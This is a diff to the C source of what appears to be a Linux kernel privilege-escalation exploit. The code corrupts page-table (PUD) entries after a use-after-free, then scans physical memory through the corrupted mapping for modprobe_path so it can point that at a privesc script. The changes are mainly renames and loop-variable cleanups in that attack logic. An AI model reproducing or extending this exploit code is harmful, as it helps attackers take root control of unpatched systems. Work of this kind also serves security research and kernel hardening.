@@ -144,7 +144,7 @@ int prepare_page_tables(void)
 			return EXIT_FAILURE;
 		}
 	}
-	printf("[+] mmap one KiB in each GiB: from %p to %p\n",
+	printf("[+] mmap one KiB in each PUD entry: from %p to %p\n",
 			PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0),
 			PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0));
 
@@ -442,17 +442,18 @@ int main(void)
 	long uaf_n = 0;
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	unsigned long phys_addr = 0;
-	struct sysinfo info;
-	int ram_gb;
+	struct sysinfo info = { 0 };
+	int huge_pages_n = 0;
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
-	/* to prevent physical memory OOB */
 	if (sysinfo(&info) != 0) {
-		perror("[!] sysinfo, setup ram_gb manually");
+		perror("[!] sysinfo");
 		goto end;
 	}
-	ram_gb = ((info.totalram * info.mem_unit / (1024 * 1024)) + 1023) / 1024;
+
+	huge_pages_n = (info.totalram * info.mem_unit / 1024 / 1024 + 1023) / 1024;
+	printf("[!] physical memory can be addressed by %d GiB huge pages\n", huge_pages_n);
 
 	ret = prepare_page_tables();
 	if (ret == EXIT_FAILURE)
@@ -555,17 +556,18 @@ int main(void)
 	if (ret == EXIT_FAILURE)
 		goto end;
 
-	for (int i = 0; i < PT_ENTRIES; i++) {
+	for (i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, i, 0, 0, 0);
 		unsigned long val = *addr;
 		char *modprobe_path_uaddr = NULL;
 		size_t new_len = 0;
+		long j = 0;
 
 		if (val == MAGIC_VAL)
 			continue;
 
 		printf("[+] corrupted PUD entry is detected, now search modprobe_path\n");
-		for (int j = 0; j < ram_gb; j++) {
+		for (j = 0; j < huge_pages_n; j++) {
 			modprobe_path_uaddr = guess_modprobe(addr, PUD_SIZE);
 			if (modprobe_path_uaddr != NULL)
 				break;
